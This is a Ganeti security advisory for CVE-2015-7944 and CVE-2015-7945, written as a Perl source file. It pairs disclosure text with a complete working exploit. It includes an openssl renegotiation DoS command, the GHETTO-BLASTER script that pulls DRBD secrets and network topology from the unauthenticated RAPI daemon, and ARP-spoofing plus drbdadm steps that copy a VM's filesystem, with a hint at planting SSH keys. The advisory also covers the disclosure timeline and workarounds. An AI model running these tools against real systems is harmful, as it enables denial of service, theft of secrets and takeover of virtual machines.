@@ -1,0 +1,884 @@
+=begin
+## Advisory Information
+
+Title: Ganeti Security Advisory (DoS, Unauthenticated Info Leak)
+Advisory URL: https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt
+Blog URL: https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html
+Date published: 2016-01-05
+Vendors contacted: Google, MITRE
+Organization contacted: Riseup
+Release mode: Released
+CVE: CVE-2015-7944, CVE-2015-7945
+CNNVD: no current CNNVD
+
+
+
+## Product Description
+
+Ganeti is a virtual machine cluster management tool developed by Google.
+The solution stack uses either Xen or KVM as the virtualization
+platform, LVM for disk management,
+and optionally DRBD for disk replication across physical hosts.
+
+
+
+## Vulnerabilities Summary
+
+Ganeti has security problems in the default install (with DRBD) and
+the default configuration due to old libraries and design problem,
+even if the security level in Ganeti seems to be high.
+
+These problems affect every versions until the last released version.
+
+The Ganeti API Daemon is open on every interface by default and an
+attacker can DoS this daemon.
+
+It is also possible to abuse this deamon to retrieve information, such
+as network topology, DRBD secrets...
+
+A PoC is provided to automaticaly retrieve sensitive information and
+a possible scenario, allowing to take over Virtual Machines remotely,
+is provided (which worked in my lab in certain conditions).
+
+
+
+## Details - CVE-2015-7944 - Unauthenticated Remote DoS
+
+Ganeti is prone to a SSL DoS with SSL renegociation against the RAPI Daemon:
+
+user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client
+-connect 10.105.1.200:5080
+CONNECTED(00000003)
+depth=0 CN = ganeti.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = ganeti.example.com
+verify return:1
+- ---
+Certificate chain
+ 0 s:/CN=ganeti.example.com
+   i:/CN=ganeti.example.com
+- ---
+Server certificate
+- -----BEGIN CERTIFICATE-----
+[...]
+- -----END CERTIFICATE-----
+subject=/CN=ganeti.example.com
+issuer=/CN=ganeti.example.com
+- ---
+No client certificate CA names sent
+- ---
+SSL handshake has read 1003 bytes and written 625 bytes
+- ---
+New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384
+Server public key is 2048 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : AES256-GCM-SHA384
+    Session-ID: D75BCF369143CD008D693B022B967149AF0BD420DE385C51227A1921CD29360D
+    Session-ID-ctx:
+    Master-Key:
+7DDD57FD479AE6555D1D42CF2B15B8857C28430189EC5C1331C75C4253E4A9F0FC0672EE2F2438CD055328C5A46C4F5F
+    Key-Arg   : None
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - 10 ad 69 39 76 6c 2e 37-cf e7 c2 2c 5f f0 e0 20   ..i9vl.7...,_..
+    0010 - 5d 85 5a 79 82 20 6a 1d-f1 6e 51 f5 f2 f7 c6 cf   ].Zy. j..nQ.....
+    0020 - c1 85 2d 42 5a 1c 53 b4-cb db de 65 04 2a 02 da   ..-BZ.S....e.*..
+    0030 - 5c 7d 82 ef 56 4a a4 a1-88 bd 87 fd af 25 e3 2e   \}..VJ.......%..
+    0040 - 28 68 04 a4 01 22 88 72-30 0b 79 1c 75 61 88 d5   (h...".r0.y.ua..
+    0050 - c9 f3 e2 0b 02 50 bf c8-29 ac d9 36 f3 76 bd 8b   .....P..)..6.v..
+    0060 - 05 e0 d3 a9 f3 8b 8b 11-ef 19 2f 94 92 30 94 58   ........../..0.X
+    0070 - aa 64 ba 3f a4 fc 15 4b-74 11 3b c3 c7 e7 d4 33   .d.?...Kt.;....3
+    0080 - dd 76 e9 e1 1b 3a 95 c4-50 28 4f 9e bc cc cb f3   .v...:..P(O.....
+    0090 - bf 4d 60 92 64 00 af 67-c0 e9 69 e3 98 54 21 dc   .M`.d..g..i..T!.
+
+    Start Time: 1438121399
+    Timeout   : 300 (sec)
+    Verify return code: 18 (self signed certificate)
+- ---
+RENEGOTIATING
+depth=0 CN = ganeti.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = ganeti.example.com
+verify return:1
+RENEGOTIATING
+depth=0 CN = ganeti.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = ganeti.example.com
+verify return:1
+RENEGOTIATING
+depth=0 CN = ganeti.example.com
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = ganeti.example.com
+verify return:1
+RENEGOTIATING
+[...]
+
+
+- From my test, 1 thread takes 75% of CPU.
+
+  `top` on the main server (10.105.1.200):
+  19734 gnt-rapi  20   0  148980  35364   4696 R  76.8  3.7   0:04.12
+ganeti-rapi
+
+
+Multiple threads will eat all the available CPUs and will likely DoS ganeti:
+
+  21280 gnt-rapi  20   0  148980  35364   4696 R  35.3  3.7   0:05.06
+ganeti-rapi
+  20968 gnt-rapi  20   0  148980  35364   4696 R  33.4  3.7   0:09.92
+ganeti-rapi
+  20969 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:09.95
+ganeti-rapi
+  21282 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:04.53
+ganeti-rapi
+  21281 gnt-rapi  20   0  148980  35364   4696 R  31.4  3.7   0:04.78
+ganeti-rapi
+
+
+An attacker can use tools from THC to perform SSL DoS too (openssl was
+the fastest solution out of the box):
+
+  https://www.thc.org/thc-ssl-dos/
+
+
+
+## Details - CVE-2015-7945 - Unauthenticated Remote Information Disclosure
+
+This vulnerability allows an attacker to retrieve data using
+information disclosure,
+allowing him, depending on the configuration, to remotely hack VMs.
+A PoC (GHETTO-BLASTER which works in Linux (Debian, Kali) and FreeBSD)
+is provided as a base64-encoded file to this email.
+This PoC is also available here:
+https://pierrekim.github.io/advisories/GHETTO-BLASTER.
+
+
+I. Design Security Problem with the RAPI Daemon
+
+In the Ganeti master node, when using /usr/sbin/gnt-network, a
+non-root user can't get information (debian-01 is the ganeti master
+node):
+
+  user@debian-01:~$ /usr/sbin/gnt-network list
+  It seems you don't have permissions to connect to the master daemon.
+  Please retry as a different user.
+  user@debian-01:~$
+
+This is common for all gnt-tools and seems to be a security design.
+
+It appears Genati by default is too open when using the RAPI daemon
+and this daemon listens on every interface by default.
+For example, the network configuration can be extracted from jobs
+using the RAPI daemon without authentication.
+
+I wrote a tool, "GHETTO-BLASTER", to industrialize the process:
+
+  user@kali:~$ ./GHETTO-BLASTER http://<ip_of_ganeti_rapi>
+
+  Example:
+    https://<ip>
+
+  2015 Pierre Kim <pierre.kim.sec@gmail.com>
+       @PierreKimSec https://pierrekim.github.io
+  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+<http://www.wtfpl.net/txt/copying/>
+  user@kali:~$ ./GHETTO-BLASTER http://10.105.1.200
+  [...]
+  [a lot of output]
+  [...]
+  user@kali:~$ ls -l 2-networks  2-networks-test-priv 2-networks-test-pub
+  -rw-r--r-- 1 user user 228 Jun 20 13:37 2-networks
+  -rw-r--r-- 1 user user 882 Jun 20 13:37 2-networks-test-priv
+  -rw-r--r-- 1 user user 881 Jun 20 13:37 2-networks-test-pub
+  user@kali:~$ cat 2-networks  2-networks-test-priv 2-networks-test-pub
+$VAR1 = [
+          {
+            'name' => 'test-priv',
+            'uri' => '/2/networks/test-priv'
+          },
+          {
+            'uri' => '/2/networks/test-pub',
+            'name' => 'test-pub'
+          }
+        ];
+$VAR1 = {
+          'mtime' => '1333027652.67126',
+          'gateway' => undef,
+          'network6' => undef,
+          'inst_list' => [],
+          'mac_prefix' => undef,
+          'serial_no' => 1,
+          'free_count' => 254,
+          'name' => 'test-priv',
+          'map' =>
+'X..............................................................................................................................................................................................................................................................X',
+          'gateway6' => undef,
+          'external_reservations' => '192.168.1.0, 192.168.1.255',
+          'uuid' => '506ad97b-2276-43f4-ae27-e6bbb97f28ff',
+          'ctime' => '1333027652.67126',
+          'reserved_count' => 2,
+          'network' => '192.168.1.0/24',
+          'group_list' => [],
+          'tags' => []
+        };
+$VAR1 = {
+          'mac_prefix' => undef,
+          'inst_list' => [],
+          'network6' => undef,
+          'mtime' => '1333027641.64375',
+          'gateway' => undef,
+          'map' =>
+'X..............................................................................................................................................................................................................................................................X',
+          'free_count' => 254,
+          'name' => 'test-pub',
+          'serial_no' => 1,
+          'reserved_count' => 2,
+          'network' => '192.168.0.0/24',
+          'ctime' => '1333027641.64375',
+          'gateway6' => undef,
+          'uuid' => '48b34199-2d23-46f0-b4aa-2539cb4a7780',
+          'external_reservations' => '192.168.0.0, 192.168.0.255',
+          'group_list' => [],
+          'tags' => []
+        };
+user@kali:~$
+
+
+It's possible to map the network and to retrieve sensible secrets.
+
+Other interesting information:
+
+osparams_secret is readable in jobs using the access to RAPI.
+
+
+II. Using this information disclosure to hack VMs:
+
+By default, /var/lib/ganeti/config.data(640, gnt-masterd:gnt-confd)
+contains the secret key for DRBD replication.
+A remote user or even a local non-root (or non gnt-masterd user) can't
+get the configuration of DRBD.
+
+This key can be extracted from jobs by abusing the RAPI daemon without
+authentication.
+
+After running GHETTO-BLASTER, you will have a lot of files:
+
+user@kali:~$ ls
+1-list-collectors                        2-jobs-121  2-jobs-154
+2-jobs-187  2-jobs-219  2-jobs-251  2-jobs-284  2-jobs-47  2-jobs-8
+1-report-all                             2-jobs-122  2-jobs-155
+2-jobs-188  2-jobs-22   2-jobs-252  2-jobs-285  2-jobs-48  2-jobs-80
+2-features                               2-jobs-123  2-jobs-156
+2-jobs-189  2-jobs-220  2-jobs-253  2-jobs-286  2-jobs-49  2-jobs-81
+2-info                                   2-jobs-124  2-jobs-157
+2-jobs-19   2-jobs-221  2-jobs-254  2-jobs-287  2-jobs-5   2-jobs-82
+2-instances                              2-jobs-125  2-jobs-158
+2-jobs-190  2-jobs-222  2-jobs-255  2-jobs-288  2-jobs-50  2-jobs-83
+2-instances-vm-01                        2-jobs-126  2-jobs-159
+2-jobs-191  2-jobs-223  2-jobs-256  2-jobs-289  2-jobs-51  2-jobs-84
+2-instances-vm-01-info-jobs              2-jobs-127  2-jobs-16
+2-jobs-192  2-jobs-224  2-jobs-257  2-jobs-29   2-jobs-52  2-jobs-85
+2-instances-vm-02.example.com            2-jobs-128  2-jobs-160
+2-jobs-193  2-jobs-225  2-jobs-258  2-jobs-290  2-jobs-53  2-jobs-86
+2-instances-vm-02.example.com-info-jobs  2-jobs-129  2-jobs-161
+2-jobs-194  2-jobs-226  2-jobs-259  2-jobs-291  2-jobs-54  2-jobs-87
+2-jobs                                   2-jobs-13   2-jobs-162
+2-jobs-195  2-jobs-227  2-jobs-26   2-jobs-292  2-jobs-55  2-jobs-88
+2-jobs-0                                 2-jobs-130  2-jobs-163
+2-jobs-196  2-jobs-228  2-jobs-260  2-jobs-293  2-jobs-56  2-jobs-89
+2-jobs-1                                 2-jobs-131  2-jobs-164
+2-jobs-197  2-jobs-229  2-jobs-261  2-jobs-294  2-jobs-57  2-jobs-9
+2-jobs-10                                2-jobs-132  2-jobs-165
+2-jobs-198  2-jobs-23   2-jobs-262  2-jobs-295  2-jobs-58  2-jobs-90
+2-jobs-100                               2-jobs-133  2-jobs-166
+2-jobs-199  2-jobs-230  2-jobs-263  2-jobs-296  2-jobs-59  2-jobs-91
+2-jobs-101                               2-jobs-134  2-jobs-167
+2-jobs-2    2-jobs-231  2-jobs-264  2-jobs-297  2-jobs-6   2-jobs-92
+2-jobs-102                               2-jobs-135  2-jobs-168
+2-jobs-20   2-jobs-232  2-jobs-265  2-jobs-298  2-jobs-60  2-jobs-93
+2-jobs-103                               2-jobs-136  2-jobs-169
+2-jobs-200  2-jobs-233  2-jobs-266  2-jobs-299  2-jobs-61  2-jobs-94
+2-jobs-104                               2-jobs-137  2-jobs-17
+2-jobs-201  2-jobs-234  2-jobs-267  2-jobs-3    2-jobs-62  2-jobs-95
+2-jobs-105                               2-jobs-138  2-jobs-170
+2-jobs-202  2-jobs-235  2-jobs-268  2-jobs-30   2-jobs-63  2-jobs-96
+2-jobs-106                               2-jobs-139  2-jobs-171
+2-jobs-203  2-jobs-236  2-jobs-269  2-jobs-31   2-jobs-64  2-jobs-97
+2-jobs-107                               2-jobs-14   2-jobs-172
+2-jobs-204  2-jobs-237  2-jobs-27   2-jobs-32   2-jobs-65  2-jobs-98
+2-jobs-108                               2-jobs-140  2-jobs-173
+2-jobs-205  2-jobs-238  2-jobs-270  2-jobs-33   2-jobs-66  2-jobs-99
+2-jobs-109                               2-jobs-141  2-jobs-174
+2-jobs-206  2-jobs-239  2-jobs-271  2-jobs-34   2-jobs-67  2-networks
+2-jobs-11                                2-jobs-142  2-jobs-175
+2-jobs-207  2-jobs-24   2-jobs-272  2-jobs-35   2-jobs-68  2-nodes
+2-jobs-110                               2-jobs-143  2-jobs-176
+2-jobs-208  2-jobs-240  2-jobs-273  2-jobs-36   2-jobs-69
+2-nodes-debian-01
+2-jobs-111                               2-jobs-144  2-jobs-177
+2-jobs-209  2-jobs-241  2-jobs-274  2-jobs-37   2-jobs-7
+2-nodes-debian-01-role
+2-jobs-112                               2-jobs-145  2-jobs-178
+2-jobs-21   2-jobs-242  2-jobs-275  2-jobs-38   2-jobs-70
+2-nodes-debian-02
+2-jobs-113                               2-jobs-146  2-jobs-179
+2-jobs-210  2-jobs-243  2-jobs-276  2-jobs-39   2-jobs-71
+2-nodes-debian-02-role
+2-jobs-114                               2-jobs-147  2-jobs-18
+2-jobs-211  2-jobs-244  2-jobs-277  2-jobs-4    2-jobs-72  2-os
+2-jobs-115                               2-jobs-148  2-jobs-180
+2-jobs-212  2-jobs-245  2-jobs-278  2-jobs-40   2-jobs-73  version
+2-jobs-116                               2-jobs-149  2-jobs-181
+2-jobs-213  2-jobs-246  2-jobs-279  2-jobs-41   2-jobs-74
+2-jobs-117                               2-jobs-15   2-jobs-182
+2-jobs-214  2-jobs-247  2-jobs-28   2-jobs-42   2-jobs-75
+2-jobs-118                               2-jobs-150  2-jobs-183
+2-jobs-215  2-jobs-248  2-jobs-280  2-jobs-43   2-jobs-76
+2-jobs-119                               2-jobs-151  2-jobs-184
+2-jobs-216  2-jobs-249  2-jobs-281  2-jobs-44   2-jobs-77
+2-jobs-12                                2-jobs-152  2-jobs-185
+2-jobs-217  2-jobs-25   2-jobs-282  2-jobs-45   2-jobs-78
+2-jobs-120                               2-jobs-153  2-jobs-186
+2-jobs-218  2-jobs-250  2-jobs-283  2-jobs-46   2-jobs-79
+
+
+Files contain DRBD secrets:
+
+user@kali:~$ grep secret *|tail -n 5
+2-jobs-80:
+                        'secret' =>
+'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
+2-jobs-82:
+            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
+2-jobs-84:
+            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
+2-jobs-85:
+            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
+2-jobs-86:
+            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
+user@kali:~$
+
+
+
+The key is confirmed by using `drbdsetup show` as root in the Ganeti
+master node:
+
+root@debian-01:~# drbdsetup show
+resource resource0 {
+    options {
+    }
+    net {
+        cram-hmac-alg           "md5";
+        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
+        after-sb-0pri           discard-zero-changes;
+        after-sb-1pri           consensus;
+    }
+    _remote_host {
+        address                 ipv4 10.105.1.201:11000;
+    }
+    _this_host {
+        address                 ipv4 10.105.1.200:11000;
+        volume 0 {
+            device                      minor 0;
+            disk
+"/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
+            meta-disk
+"/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
+            disk {
+                size                    8388608s; # bytes
+                resync-rate             61440k; # bytes/second
+            }
+        }
+    }
+}
+root@debian-01:~#
+
+
+By digging more, one of the jobs file (2-jobs-280) contains the DRDB
+configuration:
+
+[...]
+
+      'drbd_info' => {
+                       'port' => 11000,
+                       'primary_minor' => 0,
+                       'secondary_node' => 'debian-02',
+                       'secondary_minor' => 0,
+                       'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
+                       'primary_node' => 'debian-01'
+                     },
+[...]
+
+
+
+As stated in http://docs.ganeti.org/ganeti/current/html/security.html:
+
+  DRBD connections are protected from erroneous connections to other
+machines (as may happen due to software issues), and
+  from accepting connections from other machines, by using a shared
+secret, exchanged via RPC requests from the master to the nodes when
+configuring the device.
+
+
+We recovered the secret of DRBD, the port used and the nodes without
+authentication.
+Other files contain the LVM VG and the LVM LG names! It's enough to
+start playing with DRDB from an attacker side.
+
+
+
+III. DRBD Madness
+
+Now, it's time for DRBD Feng Shui!
+
+Getting the File System of a VM:
+
+o By doing ARP spoofing in the same LAN:
+
+We will impersonate 10.105.1.201 by doing ARP poisoning and using a
+valid drbd.conf thank to the parameters provided by the RAPI daemon:
+
+root@kali# cat etc-drbd.conf
+
+include "drbd.d/global_common.conf";
+include "drbd.d/*.res";
+
+resource resource0 {
+    volume 0 {
+       device minor 0;
+       disk
+"/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
+       meta-disk
+"/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
+    }
+    protocol C;
+    net {
+        cram-hmac-alg           "md5";
+        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
+        after-sb-0pri           discard-zero-changes;
+        after-sb-1pri           consensus;
+    }
+    on target {
+        address    10.105.1.200:11000;
+    }
+    on kali {
+        address    10.105.1.201:11000;
+    }
+}
+
+root@kali# vgremove xenvg-vg 2>/dev/null
+root@kali# dd if=/dev/zero of=/dev/sdb bs=1024 count=1024
+root@kali# pvcreate /dev/sdb
+root@kali# vgcreate xenvg-vg /dev/sdb
+root@kali# lvcreate --name
+41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data --size 4G xenvg-vg
+root@kali# lvcreate --name
+41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta --size 128M xenvg-vg
+root@kali# cp etc-drbd.conf /etc/drbd.conf
+root@kali# drbdadm create-md resource0
+root@kali# drbdadm up resource0
+
+<ARP poisoning> || root@kali# ifconfig eth0 10.105.1.201 netmask 255.255.255.0
+
+root@kali# drbdadm attach resource0
+root@kali# drbdadm connect resource0
+root@kali# cat /proc/drbd
+version: 8.4.3 (api:1/proto:86-101)
+srcversion: 1A9F77B1CA5FF92235C2213
+ 0: cs:SyncTarget ro:Secondary/Primary ds:Inconsistent/UpToDate C r-----
+    ns:0 nr:916568 dw:916472 dr:0 al:0 bm:55 lo:2 pe:0 ua:2 ap:0 ep:1
+wo:f oos:3277832
+        [===>................] sync'ed: 22.0% (3277832/4194304)K
+        finish: 0:08:33 speed: 6,368 (5,912) want: 4,520 K/sec
+root@kali# echo "wow synchronisation in progress !"
+wow synchronisation in progress !
+root@kali#
+
+After 10min of synchronisation, an attacker will have a perfect copy
+of the targeted VM File System using DRDB replication.
+
+It's also possible to write information in the File System (like
+adding SSH keys).
+Rooting VMs by adding ssh keys and by doing s/PermitRootLogin
+No/PermitRootLogin Yes/ is left as a exercise to the reader.
+
+
+o Other methods of MiTM exist and are left as a exercise for the reader.
+
+
+
+## Proposed Workarounds by the Security Researcher
+
+At first, I think these steps must be done to improve the security of ganeti:
+
+1/ Forcing the RAPI to listen to 127.0.0.1 instead of 0.0.0.0.
+
+  This can be done by adding by default to /etc/default/ganeti:
+
+  RAPI_ARGS="-b 127.0.0.1"
+
+  Listening to 127.0.0.1 for ganeti-mond is a good step too (it
+listens to 0.0.0.0:1815/tcp)
+
+
+2/ Adding an authentication by default for the RAPI daemon (not only
+for writing access but for reading access too)
+
+
+3/ Filtering the output of the jobs to avoid leaking secrets.
+
+  Note that the immediate step is to change the secrets used for DRBD and
+  to be sure nobody had access to the DRBD blocks, allowing a
+compromise of all the VMs.
+
+4/ Disabling SSL renegociation and updating the default ciphers.
+
+
+A personal note: as deploying a working Ganeti platform is very complicated,
+attackers will likely giving up before having a working Ganeti
+platform to study :)
+
+
+
+## Vendor Response
+
+Update to the latest version of Ganeti.
+
+Read details about mitigation measures here:
+https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg
+
+
+
+## Report Timeline
+
+ * Jul 30, 2015 : Pierre Kim sends an email to security@ganeti.org
+asking for a GPG key, email bounced
+ * Jul 30, 2015 : Pierre Kim asks Google Security Team if Ganeti is
+elligible to the Google Vulnerability Reward Program
+ * Jul 30, 2015 : Pierre Kim sends an email to Ganeti Team for a
+working security contact
+ * Jul 30, 2015 : Guido Trotter replies by saying to use
+opensource-ganeti@google.com
+ * Aug 1, 2015: Security@google.com confirms it's out of scope
+ * Aug 4, 2015: Pierre Kim says the exploits are critical and Ganeti
+is widely used by Google
+ * Aug 11, 2015: Advisories and PoC sent to Google Security Team and
+Pierre Kim asks Google Security Team to contact Riseup, as they are
+using Ganeti
+ * Aug 12, 2015: Google Security Team transmitted the information to Ganeti Team
+ * Aug 20, 2015: Google Security Team is working on the scope and the
+impact of the report
+ * Aug 27, 2015: Google Security Team decided is not within scope of
+the VRP program but a research grant is awarded as "Security
+improvement efficacy research"
+ * Aug 28, 2015: Pierre Kims provides information about DRBDv8,
+DRBDv9. Pierre Kim asks information about the DoS, the condition for
+the rewards and asks if Riseup was contacted
+ * Sep 10, 2015: Google Security Team confirms they will not contact
+Riseup and that they ask "that you act and communicate in good faith,
+use your own best judgement, and we'll do everything we can to work
+with you to resolve vulnerabilities in a reasonable timeframe"
+ * Oct 6, 2015: Pierre Kim asks for update about the security patchs
+and informs he will contact Riseup
+ * Oct 6, 2015: Riseup is contacted
+ * Oct 16, 2015: Google Security Team confirm releases end of October
+and asks about CVEs from MITRE. The Ganeti Bug #1135 is created
+ * Oct 17, 2015: Pierre Kim asks Google to ask MITRE CVE assignments
+and proposes to contact CNNVD to get a CNNVD entry
+ * Oct 17, 2015: Google Security Team contacted MITRE to get CVEs
+ * Oct 23, 2015: Google Security Team has 2 CVE: CVE-2015-7944 and CVE-2015-7945
+ * Nov 3, 2015: Pierre Kim informs new security with a DoS with the
+jobs creation
+ * Nov 5, 2015: Ganeti Team has rate-limit to 20 concurrent jobs
+creation, which limit the problems and declares the patch will be very
+soon
+ * Nov 17, 2015: Ganeti Team announces new releases next week
+ * Nov 23, 2015: a pre-advisory is sent to Ganeti Team and Google Security Team
+ * Dec 30, 2015: Ganeti Team releases a security advisory
+ * Jan 05, 2015: A public advisory is sent to security mailing lists
+
+
+
+## Credit
+
+These vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+
+
+## Greetings
+
+Big thanks to my friends Alexandre Torres, Jordan, Jerome and Stephen.
+
+Thanks to Google Security Team which coordinated the issues by
+contacting MITRE and the different parties.
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt
+https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html
+http://www.ocert.org/advisories/ocert-2015-012.html
+https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg
+
+
+
+## PoC - GHETTO-BLASTER
+=end
+
+#!/usr/bin/perl -w
+
+use LWP::UserAgent;
+use JSON;
+use Data::Dumper;
+use strict;
+use warnings;
+
+my $i_want_readable_json = 1;
+
+if (!(defined($ARGV[0])))
+{
+  print "$0 http://<ip_of_ganeti_rapi>\n\n";
+  print "  Example:\n";
+  print "    https://<ip>\n";
+} else {
+  print "GHETTO-BLASTER - a Ganeti data agregation tool\n";
+}
+print "\n";
+print "  2015 Pierre Kim <pierre.kim.sec\@gmail.com>\n";
+print "       \@PierreKimSec https://pierrekim.github.io/\n";
+print "  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE <http://www.wtfpl.net/txt/copying/>\n\n";
+exit (1) if (!(defined($ARGV[0])));
+
+my $base_url          = $ARGV[0];
+my $default_rapi_port = 5080;
+my $default_mond_port = 1815;
+
+my %basic_cmds = (
+  "info" =>     { "url" => "/2/info",     "output_file" => "2-info",      "is_json" => 1 },
+  "version" =>  { "url" => "/version",    "output_file" => "version",     "is_json" => 0 },
+  "features" => { "url" => "/2/features", "output_file" => "2-features",  "is_json" => 1 },
+  "os" =>       { "url" => "/2/os",       "output_file" => "2-os",        "is_json" => 0 }
+);
+
+$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
+
+
+
+# FIXME:
+# /2/filters
+# /2/filters?bulk=1
+# /2/groups/tags
+# /2/instances/[instance_name]/tags
+# /2/nodes/tags
+# /2/tags
+# /2/networks/[network_name]/tags
+#
+
+# TO TEST:
+# /2/groups/[group_name]
+# /2/networks/[network_name]
+
+
+&main();
+
+
+sub main()
+{
+  &greetings("You are being visited by GHETTO-BLASTER a Ganeti data agregation tool");
+
+  for my $cmd (keys %basic_cmds)
+  {
+    my $res = &get_target($base_url . ":" . $default_rapi_port . $basic_cmds{$cmd}->{"url"});
+    &save_data_leak($res, $basic_cmds{$cmd}->{"output_file"}, $basic_cmds{$cmd}->{"is_json"});
+  }
+
+  &parse_instances();
+  &parse_networks();
+  &parse_groups();
+  &parse_nodes();
+  &parse_mond();
+  &parse_jobs();
+  &greetings("Thank you for using Ganeti and have a nice day!");
+}
+
+
+sub greetings()
+{
+  my $msg = $_[0];
+
+  $msg =~ s/ /_/g;
+  print "Sending Banner to the remote API Daemon: $msg\n";
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/" . $msg, 1);
+}
+
+
+sub parse_mond()
+{
+  my $res;
+  my $base_url_http = $base_url;
+
+  $base_url_http =~ s/https/http/;
+  
+  $res = &get_target($base_url_http . ":" . $default_mond_port . "/1/list/collectors");
+  &save_data_leak($res, "1-list-collectors", 0);
+  $res = &get_target($base_url_http . ":" . $default_mond_port . "/1/report/all");
+  &save_data_leak($res, "1-report-all", 0);
+}
+
+
+sub parse_instances()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/instances");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-instances", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-instances-$data->{'id'}", 1, $data->{'id'});
+
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'} . "/info");
+    print "Sleep (10) because job is in progress ...\n";
+    sleep 10; # we need to sleep(10) when asking the instances/info due to the creation of a job
+    $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs/" . $res);
+    &save_data_leak($res, "2-instances-$data->{'id'}-info-jobs", 1, "2/instances/$data->{'id'}/info-jobs");
+  }
+}
+
+
+sub parse_networks()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/networks");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-networks", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-networks-$data->{'name'}", 1, $data->{'uri'});
+  }
+}
+
+
+sub parse_groups()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/groups");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-groups", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-groups-$data->{'name'}", 1, $data->{'uri'});
+  }
+}
+
+
+sub parse_nodes()
+{
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/nodes");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-nodes", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'});
+    &save_data_leak($res, "2-nodes-$data->{'id'}", 1, $data->{'id'});
+
+    $res = &get_target($base_url . ":" . $default_rapi_port . $data->{'uri'} . "/role");
+    &save_data_leak($res, "2-nodes-$data->{'id'}-role", 0, "nodes/$data->{'id'}-role");
+  }
+}
+
+
+sub parse_jobs()
+{
+  my $total_jobs = 0;
+  my $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs");
+
+  my $decoded_json = JSON::decode_json($res);
+
+  &save_data_leak($res, "2-jobs", 1);
+
+  foreach my $data (@{$decoded_json})
+  {
+    $total_jobs = $data->{'id'} if ($data->{'id'} > $total_jobs);
+  }
+
+  for my $i (0 .. $total_jobs)
+  {
+    $res = &get_target($base_url . ":" . $default_rapi_port . "/2/jobs/" . $i);
+    &save_data_leak($res, "2-jobs-$i", 1);
+  }
+}
+
+
+sub save_data_leak()
+{
+  my $input = $_[0];
+  my $output_file = $_[1];
+  my $is_json = $_[2];
+  my $stdout = $_[3] || $output_file;
+  my $json;
+
+  print "Parsing $stdout ... saving to $output_file\n";
+  $input = Dumper(JSON::decode_json($input)) if ($i_want_readable_json && $is_json);
+  open (FILE, ">", "$output_file");
+  print FILE ($input);
+  close (FILE);
+}
+
+
+sub get_target()
+{
+  my $target = $_[0];
+  my $error_ok = $_[1];
+  my ($ua, $res, $req);
+
+  $ua = LWP::UserAgent->new(
+    ssl_opts => { verify_hostname => 0, SSL_verify_mode => 0 }
+  );
+  $ua->agent("Ganeti/2.12");
+  $ua->env_proxy;
+  $ua->timeout(10);
+  $req = new HTTP::Request GET => $target;
+  $res = $ua->request($req);
+
+  print "Error when requesting $target\n" if (!$res->is_success && !$error_ok);
+
+  return ($res->content);
+}
+
+
+=begin
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+
+-- 
+Pierre Kim
+pierre.kim.sec@gmail.com
